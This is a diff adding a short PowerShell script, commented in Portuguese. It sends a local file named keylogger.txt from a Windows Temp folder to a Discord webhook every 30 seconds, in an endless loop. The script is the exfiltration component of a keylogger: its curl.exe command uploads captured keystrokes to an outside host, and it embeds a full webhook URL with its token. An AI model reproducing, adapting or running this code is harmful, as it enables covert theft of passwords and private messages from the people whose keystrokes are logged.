@@ -1,0 +1,16 @@
+# CONFIGURAÇÃO BÁSICA
+$webhookUrl = "https://discord.com/api/webhooks/1405002732817088533/nLnHnKuwx_5yGquy6vVKVC0NFQPFDvygvxcM9kUK9zdNh3hLZDx5s0XLNcvTRnIcX_YK"  # 👈 SUBSTITUA
+$caminhoArquivo = "C:\Users\BrunoMassa\AppData\Local\Temp\keylogger.txt"  # 👈 SUBSTITUA
+
+# LOOP PRINCIPAL (Ctrl+C para parar)
+while ($true) {
+    try {
+        curl.exe -s -S -F "file1=@$caminhoArquivo" $webhookUrl
+        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] ✅ Arquivo enviado!" -ForegroundColor Green
+    }
+    catch {
+        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] ❌ Erro:" $_.Exception.Message -ForegroundColor Red
+    }
+    
+    Start-Sleep -Seconds 30  # Espera 30 segundos
+}
